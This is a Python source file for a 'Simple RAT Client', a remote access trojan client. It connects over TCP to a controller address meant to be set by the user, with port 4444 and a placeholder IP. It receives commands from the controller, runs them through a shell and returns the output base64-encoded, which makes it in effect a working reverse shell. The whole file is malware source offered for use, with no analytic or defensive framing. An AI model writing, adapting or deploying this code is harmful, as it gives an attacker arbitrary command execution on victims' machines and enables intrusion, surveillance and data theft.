#!/usr/bin/env python3
"""
SIMPLE RAT CLIENT - Fixed version
"""

import socket
import subprocess
import os
import json
import base64
import sys
import time

SERVER_HOST = "127.0.0.1"  # Ganti dengan IP server
SERVER_PORT = 4444

class SimpleRATClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        
    def reliable_send(self, data):
        """Send data to server"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            json_data = json.dumps(data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data)
            encoded_data = base64.b64encode(json_data.encode('utf-8'))
            self.socket.send(len(encoded_data).to_bytes(4, 'big') + encoded_data)
            return True
        except Exception as e:
            print(f"❌ Send error: {e}")
            return False

    def reliable_receive(self):
        """Receive data from server"""
        try:
            raw_len = self.socket.recv(4)
            if not raw_len:
                return None
            data_len = int.from_bytes(raw_len, 'big')
            data = b''
            while len(data) < data_len:
                packet = self.socket.recv(data_len - len(data))
                if not packet:
                    return None
                data += packet
            
            decoded_data = base64.b64decode(data)
            return json.loads(decoded_data)
        except Exception as e:
            print(f"❌ Receive error: {e}")
            return None

    def connect_to_server(self):
        """Connect to RAT server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.server_host, self.server_port))
            print(f"✅ Connected to {self.server_host}:{self.server_port}")
            return True
        except Exception as e:
            print(f"❌ Connection failed: {e}")
            return False

    def execute_command(self, command):
        """Execute command locally"""
        try:
            if command.startswith('cd '):
                os.chdir(command[3:])
                return f"📁 Changed to: {os.getcwd()}"
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                return output if output else "✅ Command executed"
        except Exception as e:
            return f"❌ Command error: {str(e)}"

    def start_client(self):
        """Main client loop"""
        if not self.connect_to_server():
            return
            
        try:
            # Receive welcome message
            welcome = self.reliable_receive()
            if welcome:
                print(f"🖥️  {welcome}")
            
            print("⏳ Waiting for commands from server...")
            
            while True:
                # Receive command from server
                command = self.reliable_receive()
                if not command:
                    print("❌ Server disconnected")
                    break
                
                # Check for exit command
                if command.lower() in ['exit', 'quit']:
                    print("👋 Server requested disconnect")
                    break
                
                print(f"📨 Received command: {command}")
                
                # Execute command
                result = self.execute_command(command)
                
                # Send result back to server
                if not self.reliable_send(result):
                    break
                    
        except Exception as e:
            print(f"💥 Client error: {e}")
        finally:
            if self.socket:
                self.socket.close()
            print("🛑 Client stopped")

def main():
    print("🐀 Simple RAT Client Starting...")
    print("=" * 40)
    print(f"Target: {SERVER_HOST}:{SERVER_PORT}")
    print("=" * 40)
    
    client = SimpleRATClient(SERVER_HOST, SERVER_PORT)
    client.start_client()

if __name__ == "__main__":
    main()